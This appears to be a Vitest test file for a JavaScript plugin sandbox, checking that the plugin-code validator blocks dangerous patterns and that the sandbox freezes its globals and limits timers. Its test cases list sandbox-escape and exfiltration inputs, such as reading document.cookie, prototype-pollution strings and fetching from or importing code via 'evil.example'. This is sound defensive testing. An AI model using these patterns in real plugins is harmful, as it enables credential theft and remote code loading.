import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { createPluginSandbox, validatePluginCode } from '@/plugins/pluginSandbox'
import type { PluginAPI } from '@/plugins/pluginManager'

/** 构造一个只记录调用的最小 PluginAPI mock */
function createMockApi(): PluginAPI {
  return {
    pluginId: 'test-plugin',
    permissions: [],
    log: {
      info: vi.fn(),
      warn: vi.fn(),
      error: vi.fn(),
      debug: vi.fn(),
    },
  } as unknown as PluginAPI
}

describe('pluginSandbox - validatePluginCode 代码安全检查', () => {
  it('放行正常的插件代码', () => {
    const code = `
      var plugin = {
        activate: function (api) {
          api.log.info('hello')
          api.storage.set('counter', 1)
        }
      }
    `
    expect(validatePluginCode(code)).toBe(true)
  })

  it('拒绝超过 1MB 的代码', () => {
    const code = 'var x = "' + 'a'.repeat(1024 * 1024 + 1) + '"'
    expect(() => validatePluginCode(code)).toThrow('插件代码过大')
  })

  it.each([
    ['eval', 'eval("1+1")'],
    ['Function 构造函数', 'new Function("return 1")'],
    ['window', 'window.location'],
    ['document', 'document.cookie'],
    ['globalThis', 'globalThis.fetch'],
    ['self', 'self.postMessage'],
    ['top', 'top.document'],
    ['parent', 'parent.frameElement'],
    ['process', 'process.env'],
    ['require', 'require("fs")'],
    ['module', 'module.exports'],
    ['__dirname', '__dirname + "/x"'],
    ['__proto__ 污染', 'obj.__proto__ = {}'],
    ['constructor 访问', 'obj.constructor.constructor'],
    ['prototype 动态访问', 'obj.prototype[0]'],
    ['getPrototypeOf', 'Object.getPrototypeOf(obj)'],
    ['setPrototypeOf', 'Object.setPrototypeOf(a, b)'],
    ['Reflect API', 'Reflect.ownKeys(obj)'],
    ['fetch', 'fetch("https://evil.example")'],
    ['XMLHttpRequest', 'new XMLHttpRequest()'],
    ['WebSocket', 'new WebSocket("wss://x")'],
    ['Worker', 'new Worker("x.js")'],
    ['localStorage', 'localStorage.getItem("k")'],
    ['sessionStorage', 'sessionStorage.setItem("k", 1)'],
    ['indexedDB', 'indexedDB.open("db")'],
    ['动态 import', 'import("https://evil.example/x.js")'],
    ['importScripts', 'importScripts("x.js")'],
    ['fromCharCode', 'String.fromCharCode(65)'],
    ['Proxy', 'new Proxy({}, {})'],
    ['getOwnPropertyNames', 'Object.getOwnPropertyNames(obj)'],
    // 字符串形式的危险属性访问 (在字符串剥离前检查,依赖字符串内容才能命中)
    ['字符串形式的 constructor 访问 (双引号)', 'var x = obj["constructor"]'],
    ['字符串形式的 constructor 访问 (单引号)', "var x = obj['constructor']"],
    ['字符串形式的 constructor 访问 (模板串)', 'var x = obj[`constructor`]'],
    ['十六进制转义访问', "var x = obj['\\x63onstructor']"],
    ['Unicode 转义访问', "var x = obj['\\u0063onstructor']"],
  ])('拒绝危险模式: %s', (_name, code) => {
    expect(() => validatePluginCode(code)).toThrow('插件代码包含不安全的模式')
  })

  it('字符串与注释内容不触发误报 (内容会被剥离,运行时不可达)', () => {
    // 字符串内的 "eval" 被替换为空串,不应触发检查
    expect(validatePluginCode(`api.log.info("eval is a word")`)).toBe(true)
    // 注释内的危险词同理
    expect(validatePluginCode(`var a = 1; /* eval */ // window`)).toBe(true)
    // 注释内的字符串形式 constructor 访问同理: 注释先于所有模式检查被移除
    expect(validatePluginCode(`var a = 1; /* obj['constructor'] */`)).toBe(true)
  })

  it('拒绝过多动态属性访问 (混淆逃逸的常见特征)', () => {
    const code =
      'var x = ' + Array.from({ length: 20 }, (_, i) => `a[${i ? 'b' + i : 'c'}]`).join('+')
    expect(() => validatePluginCode(code)).toThrow('过多动态属性访问')
  })

  it('拒绝过深嵌套调用 (4 层及以上)', () => {
    expect(() => validatePluginCode('f(g(h(1)))')).not.toThrow()
    expect(() => validatePluginCode('f(g(h(i(1))))')).toThrow('过深的嵌套调用')
  })
})

describe('pluginSandbox - createPluginSandbox 沙箱环境', () => {
  beforeEach(() => {
    vi.useFakeTimers()
  })

  afterEach(() => {
    vi.useRealTimers()
  })

  it('全局对象被冻结,插件无法篡改', () => {
    const sandbox = createPluginSandbox(createMockApi())
    expect(Object.isFrozen(sandbox.globals)).toBe(true)
    expect(Object.isFrozen(sandbox.globals.JSON)).toBe(true)
    expect(Object.isFrozen(sandbox.globals.console)).toBe(true)
  })

  it('console 被代理到 api.log', () => {
    const api = createMockApi()
    const sandbox = createPluginSandbox(api)
    sandbox.globals.console.log('a')
    sandbox.globals.console.error('b')
    expect(api.log.info).toHaveBeenCalledWith('a')
    expect(api.log.error).toHaveBeenCalledWith('b')
  })

  it('setTimeout 延迟被限制在 60s 内', () => {
    const sandbox = createPluginSandbox(createMockApi())
    vi.spyOn(globalThis, 'setTimeout')
    const setTimeoutSpy = vi.spyOn(globalThis, 'setTimeout')
    sandbox.globals.setTimeout(() => {}, 999999)
    expect(setTimeoutSpy).toHaveBeenCalledWith(expect.any(Function), 60000)
    vi.restoreAllMocks()
  })

  it('setInterval 最小间隔为 100ms', () => {
    const sandbox = createPluginSandbox(createMockApi())
    const setIntervalSpy = vi.spyOn(globalThis, 'setInterval')
    sandbox.globals.setInterval(() => {}, 1)
    expect(setIntervalSpy).toHaveBeenCalledWith(expect.any(Function), 100)
    vi.restoreAllMocks()
  })

  it('cleanup 清理所有未触发的定时器', () => {
    const sandbox = createPluginSandbox(createMockApi())
    const callback = vi.fn()
    sandbox.globals.setTimeout(callback, 1000)
    sandbox.globals.setInterval(callback, 1000)
    sandbox.cleanup()
    vi.advanceTimersByTime(5000)
    expect(callback).not.toHaveBeenCalled()
  })

  it('execute 执行函数并在出错时记录日志后重新抛出', async () => {
    const api = createMockApi()
    const sandbox = createPluginSandbox(api)
    const result = await sandbox.execute(() => 42)
    expect(result).toBe(42)

    await expect(
      sandbox.execute(() => {
        throw new Error('boom')
      }),
    ).rejects.toThrow('boom')
    expect(api.log.error).toHaveBeenCalledWith('插件执行错误:', expect.any(Error))
  })
})
